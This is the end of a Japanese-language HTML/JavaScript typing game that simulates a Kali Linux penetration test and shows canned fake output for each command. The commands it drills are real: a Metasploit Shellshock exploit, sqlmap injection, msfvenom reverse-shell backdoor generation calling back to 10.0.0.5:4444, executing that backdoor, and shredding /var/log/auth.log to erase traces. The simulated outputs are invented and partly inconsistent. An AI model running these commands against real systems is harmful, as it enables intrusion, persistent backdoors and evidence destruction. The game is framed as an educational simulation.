                    "openvas --scan 192.168.1.100":
`OpenVAS Scan Report
====================
Scan finished: 2023-10-05 12:10:00
Host: 192.168.1.100

NVT Count: 89,213
Tests Performed: 4,567

Results Summary:
===============
High: 2 vulnerabilities
Medium: 8 vulnerabilities
Low: 15 vulnerabilities
Log: 42 messages

[High] SSH Weak Encryption Algorithms
[High] Apache mod_ssl Buffer Overflow

[+] OpenVASスキャン完了
[+] 2つの高危険脆弱性を発見
[+] 暗号化設定の脆弱性を特定`,

                    "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 192.168.1.100; exploit'":
`[*] Processing exploit/multi/http/apache_mod_cgi_bash_env_exec.rb for ERB directives.
[*] Started reverse TCP handler on 10.0.0.5:4444 
[*] Sending stage (3012516 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 192.168.1.100:45234)

meterpreter > getuid
Server username: www-data

meterpreter > sysinfo
Computer    : webserver
OS          : Linux webserver 5.10.0-8-amd64
Architecture: x64

[+] メーターセッション確立
[+] 初期アクセスを取得しました
[+] ユーザー: www-data`,

                    "sqlmap -u 'http://192.168.1.100/login.php' --data='username=admin&password=pass' --dbs":
`[12:15:00] [INFO] testing connection to the target URL
[12:15:02] [INFO] testing if the target URL content is stable
[12:15:05] [INFO] target URL appears to be dynamic
[12:15:10] [INFO] heuristic test shows that GET parameter 'id' might be injectable
[12:15:15] [INFO] testing for SQL injection on GET parameter 'id'
[12:15:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time
[12:15:25] [INFO] retrieved: information_schema
[12:15:30] [INFO] retrieved: wordpress_db
[12:15:35] [INFO] retrieved: admin_db

available databases [3]:
[*] information_schema
[*] wordpress_db
[*] admin_db

[+] SQLインジェクション成功
[+] 3つのデータベースを発見
[+] 管理者データベース (admin_db) を特定`,

                    "searchsploit linux kernel 5.4":
`Exploit Title                                                      | Path
Apache 2.4.29 - Remote Code Execution                              | /exploits/linux/remote/45666.py
Apache 2.4.29 - mod_cgi Remote Code Execution                      | /exploits/linux/remote/50457.py
Linux Kernel 5.4 - 'ErrorLog' Local Privilege Escalation           | /exploits/linux/local/46676.php
Linux Kernel 5.4 - Dirty Pipe Local Privilege Escalation           | /exploits/linux/local/50808.c
Linux Kernel 5.4 - 'perf_event_open' Race Condition                | /exploits/linux/local/50847.c

Shellcodes: No Results

[+] 5つのエクスプロイトを発見
[+] 権限昇格の可能性あり
[+] Dirty Pipe (CVE-2022-0847) エクスプロイトが利用可能`,

                    "python -c 'import pty; pty.spawn(\"/bin/bash\")'":
`www-data@webserver:/var/www/html$ whoami
www-data

www-data@webserver:/var/www/html$ sudo -l
[sudo] password for www-data: 

www-data@webserver:/var/www/html$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/su

[+] 対話的シェルを確立
[+] 11のSUIDファイルを発見
[+] 権限昇格の可能性を確認`,

                    "find / -perm -4000 -type f 2>/dev/null":
`/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

[+] SUIDファイルを列挙完了
[+] 権限昇格の可能性を分析中...
[+] 潜在的な脆弱性: /usr/bin/mount, /usr/bin/umount`,

                    "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > backdoor.elf":
`Payload size: 207 bytes
Final size of elf file: 235 bytes
Saved as: backdoor.elf

[+] Backdoor created successfully
[+] MD5: 1a2b3c4d5e6f7890abcdef1234567890
[+] SHA256: abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890

[+] バックドア生成完了
[+] ターゲットに転送します
[+] ペイロードサイズ: 235 bytes`,

                    "chmod +x backdoor.elf && ./backdoor.elf":
`[+] Executing backdoor...
[+] Backdoor activated
[+] Listening on port 4444
[+] Connection from 192.168.1.100:54321
[+] Meterpreter session 2 opened

[+] バックドア実行完了
[+] 永続的アクセスを確立
[+] メーターセッション2を開始`,

                    "shred -z -u /var/log/auth.log":
`[+] Deleting authentication logs...
[+] Overwriting log files (3 passes)...
[+] Log file shredding complete
[+] All authentication traces removed

[+] 痕跡消去完了
[+] ログファイルを完全に削除
[+] 認証記録を消去`
                };
                
                return outputs[command] || `[+] コマンドが正常に実行されました\n[+] ターゲットへのアクセスを確立しました\n[+] プロセス完了`;
            }

            // ネットワーク接続のアクティブ化
            function activateNetworkConnection() {
                const stage = gameState.currentStage;
                const command = gameState.currentCommand - 1;
                
                console.log("ネットワーク接続をアクティブ化:", { stage, command });
                
                // ステージとコマンドに応じて接続をアクティブ化
                if (stage === 0) {
                    if (command === 0) {
                        gameState.networkConnections[0].active = true;
                        addTerminalMessage("", "[+] ネットワーク接続: 攻撃者 → ルーター", "terminal-success");
                    } else if (command === 1) {
                        gameState.networkConnections[1].active = true;
                        addTerminalMessage("", "[+] ネットワーク接続: ルーター → サーバー", "terminal-success");
                    } else if (command === 2) {
                        gameState.networkConnections[2].active = true;
                        addTerminalMessage("", "[+] ネットワーク接続: ルーター → ターゲット", "terminal-success");
                    }
                } else if (stage === 2 && command === 0) {
                    gameState.networkConnections.forEach(conn => conn.active = true);
                    addTerminalMessage("", "[+] すべてのネットワーク接続を確立", "terminal-success");
                }
                
                updateConnections();
                
                // ノードのアニメーション
                const targetNode = document.getElementById('node-target');
                if (targetNode && stage >= 2) {
                    targetNode.style.animation = 'pulse 1s infinite';
                    targetNode.style.boxShadow = '0 0 30px rgba(255, 107, 107, 0.7)';
                }
            }

            // 現在のステージを完了
            function completeCurrentStage() {
                console.log("ステージを完了:", gameState.currentStage);
                
                // ステージアイテムを完了としてマーク
                const stageItems = document.querySelectorAll('.vm-menu-item[data-stage]');
                stageItems[gameState.currentStage].classList.add('active');
                
                // 次のステージへ
                gameState.currentStage++;
                gameState.currentCommand = 0;
                
                console.log("次のステージ:", gameState.currentStage);
                
                if (gameState.currentStage < gameState.stages.length) {
                    addTerminalMessage("", "=".repeat(50), "terminal-success");
                    addTerminalMessage("", `ステージ ${gameState.currentStage + 1} 開始: ${gameState.stages[gameState.currentStage].name}`, "terminal-success");
                    addTerminalMessage("", `説明: ${gameState.stages[gameState.currentStage].desc}`, "terminal-success");
                    addTerminalMessage("", "=".repeat(50), "terminal-success");
                    
                    // 次のステージのツールを選択
                    const nextTool = getToolForStage(gameState.currentStage);
                    selectTool(nextTool);
                    
                    updateCommandDisplay();
                    updateStats();
                } else {
                    gameComplete();
                }
            }

            // ステージに対応するツールを取得
            function getToolForStage(stageIndex) {
                const stageTools = ['nmap', 'nikto', 'metasploit', 'john', 'metasploit'];
                return stageTools[stageIndex] || 'nmap';
            }

            // コマンド表示の更新
            function updateCommandDisplay() {
                const currentStage = gameState.stages[gameState.currentStage];
                const command = currentStage.commands[gameState.currentCommand];
                
                console.log("コマンド表示を更新:", command);
                
                commandToType.textContent = command;
                commandToType.innerHTML = command; // ハイライトをリセット
                
                // 入力フィールドをクリアしてフォーカス
                commandInput.value = '';
                setTimeout(() => {
                    commandInput.focus();
                    handleCommandInput();
                }, 10);
            }

            // 統計の更新
            function updateStats() {
                // 正確率
                const accuracy = gameState.commandsTyped > 0 
                    ? Math.round((gameState.correctCommands / gameState.commandsTyped) * 100) 
                    : 100;
                accuracyElement.textContent = `${accuracy}%`;
                
                // WPM
                const minutes = (Date.now() - gameState.startTime) / 60000;
                const wpm = minutes > 0 ? Math.round(gameState.correctCommands / minutes) : 0;
                wpmElement.textContent = wpm;
                
                // ステージ
                stageElement.textContent = `${gameState.currentStage + 1}/${gameState.stages.length}`;
            }

            // ターミナルにメッセージを追加
            function addTerminalMessage(prompt, message, type) {
                const line = document.createElement('div');
                line.className = 'terminal-line';
                
                if (prompt) {
                    const promptSpan = document.createElement('span');
                    promptSpan.className = 'terminal-prompt';
                    promptSpan.textContent = prompt;
                    line.appendChild(promptSpan);
                }
                
                const messageSpan = document.createElement('span');
                messageSpan.className = type;
                messageSpan.textContent = message;
                line.appendChild(messageSpan);
                
                terminalOutput.appendChild(line);
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            }

            // 時間表示の更新
            function updateTime() {
                const now = new Date();
                const timeString = now.toLocaleTimeString('ja-JP', { 
                    hour12: false,
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                currentTimeElement.textContent = timeString;
            }

            // ゲーム完了
            function gameComplete() {
                console.log("ゲーム完了");
                
                addTerminalMessage("", "=".repeat(50), "terminal-success");
                addTerminalMessage("", "ハッキングシミュレーション完了", "terminal-success");
                addTerminalMessage("", "=".repeat(50), "terminal-success");
                addTerminalMessage("", "すべてのステージをクリアしました！", "terminal-success");
                addTerminalMessage("", "ターゲットシステムへの完全なアクセスを確立しました。", "terminal-success");
                addTerminalMessage("", "", "terminal-success");
                addTerminalMessage("", "【統計サマリー】", "terminal-success");
                addTerminalMessage("", `総実行コマンド: ${gameState.commandsTyped}`, "terminal-success");
                addTerminalMessage("", `正確率: ${accuracyElement.textContent}`, "terminal-success");
                addTerminalMessage("", `平均WPM: ${wpmElement.textContent}`, "terminal-success");
                
                const totalTime = ((Date.now() - gameState.startTime) / 1000 / 60).toFixed(1);
                addTerminalMessage("", `総所要時間: ${totalTime}分`, "terminal-success");
                addTerminalMessage("", "", "terminal-success");
                addTerminalMessage("", "おめでとうございます！カリLinux VMを使った", "terminal-success");
                addTerminalMessage("", "基本的なハッキングフローを学習しました。", "terminal-success");
                addTerminalMessage("", "", "terminal-success");
                addTerminalMessage("", "注意: これは教育用シミュレーションです。", "terminal-success");
                addTerminalMessage("", "実際のシステムへの不正アクセスは法律で禁止されています。", "terminal-success");
                addTerminalMessage("", "=".repeat(50), "terminal-success");
                
                // 入力フィールドを無効化
                commandInput.disabled = true;
                commandInput.placeholder = "シミュレーション完了";
                
                // ネットワークマップの最終アニメーション
                document.querySelectorAll('.node').forEach(node => {
                    node.style.animation = 'pulse 2s infinite';
                });
                
                gameState.networkConnections.forEach(conn => conn.active = true);
                updateConnections();
            }

            // ゲームの開始
            console.log("Kali Linux VM シミュレーターを開始します...");
            initGame();
        });
    </script>
</body>
</html>
